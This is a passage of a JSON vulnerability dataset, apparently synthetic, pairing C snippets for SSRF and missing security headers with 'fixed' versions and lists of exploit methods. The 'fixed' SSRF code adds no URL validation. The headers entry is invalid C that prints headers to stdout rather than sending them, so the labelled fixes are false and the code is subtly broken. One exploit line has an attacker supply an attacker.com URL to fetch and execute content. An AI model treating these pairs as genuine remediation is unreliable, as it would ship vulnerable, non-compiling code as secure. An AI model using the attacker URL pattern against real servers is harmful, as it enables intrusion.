        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n#include <curl/curl.h>\n\nvoid fetchData(const char *url) {\n    CURL *curl;\n    CURLcode res;\n    curl = curl_easy_init();\n    if(curl) {\n        curl_easy_setopt(curl, CURLOPT_URL, url);\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);\n        res = curl_easy_perform(curl);\n        curl_easy_cleanup(curl);\n    }\n}",
        "exploit_ways": [
            "An attacker could input 'http://attacker.com/malicious-file' to fetch and execute malicious content on the server.",
            "By using a crafted URL with internal IP addresses like 'http://127.0.0.1/private-data', an attacker can access sensitive data within the internal network.",
            "Exploiting DNS rebinding techniques, attackers could cause SSRF vulnerabilities to interact with services that are only available on private networks."
        ]
    },
    "c_49": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "#include <stdio.h>\\n\\nstruct WebServer {\\n    void start() {\\n        printf(\"Server started on port 80\\\\n\");\\n    }\\n};",
        "cvss_score": 2.7,
        "fixed_code": "#include <stdio.h>\\n#include <string.h>\\n\\nstruct WebServer {\\n    void start() {\\n        printf(\"Content-Security-Policy: default-src 'self'\\\\n\\\");\\n        printf(\"X-Frame-Options: SAMEORIGIN\\\\n\\\");\\n        printf(\"X-XSS-Protection: 1; mode=block\\\\n\\\");\\n        printf(\"Server started on port 80\\\\n\");\\n    }\\n};",
        "exploit_ways": [
            "An attacker can inject malicious scripts into the page, leading to XSS attacks.",
            "The server is vulnerable to clickjacking since it does not set X-Frame-Options.",
            "Without Content-Security-Policy, an attacker could load resources from untrusted domains."
        ]
    }
}